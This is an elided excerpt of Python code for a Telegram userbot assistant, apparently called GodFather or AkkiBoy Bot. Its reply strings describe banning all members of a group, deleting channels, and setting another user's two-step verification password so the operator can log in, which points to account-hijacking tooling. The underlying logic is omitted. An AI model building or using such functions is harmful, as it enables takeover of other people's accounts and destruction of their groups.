...
LEGEND_PIC = "https://telegra.ph/file/1e0dd4e43bc772e650560.jpg"
...
async def killer():
    ...
    The_AkkiBoy = bot.uid
    legd_mention = f"[{LEGEND_USER}](tg://user?id={The_AkkiBoy})"
    ...
    if bot_name.endswith("Assistant"):
        ...
        try:
            ...
            await asyncio.sleep(1)
            await bot.send_file(
                "@BotFather", "Godbot/helpers/resources/pics/main.jpg"
            )
...
async def help(event):
    ...
    if event.query.user_id is not bot.uid:
        ...
        await tgbot.send_message(
            event.chat_id,
            message=f"Hey, I am your {bot_id}'s assistant bot.\nI Am Here To Help U \n\nPowered By [GodFather-Bot](https://t.me/GODFATHERUSERBOT_SUPPORT)",
            buttons=[
                [
                    Button.url(" Support ", "https://t.me/GODFATHERUSERBOT_SUPPORT"),
                    Button.url(" Updates ", "https://t.me/Godfatheruserbot_update"),
                ],
                [
...
async def rel(event):
    if event.query.user_id == bot.uid:
        await event.answer("ShutDown Godẞø†...", cache_time=0, alert=True)
        if BOTLOG:
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        await event.reply(
            "Banning all members. Thanks For using AkkiBoy Bot", buttons=keyboard
        )
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        await event.reply(i + "\n\nThanks For using AkkiBoy Bot", buttons=keyboard)
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        await event.reply(
            "Joined the Channel/Group Thanks For using AkkiBoy Bot", buttons=keyboard
        )
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        await event.reply(
            "Deleted the Channel/Group Thanks For using AkkiBoyBot.", buttons=keyboard
        )
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        if i:
            await event.reply(
                "User don't have two step thats why now two step is `AkkiBoy Bot Is best` you can login now\n\nThanks For using AkkiBoy Bot.",
                buttons=keyboard,
            )
        else:
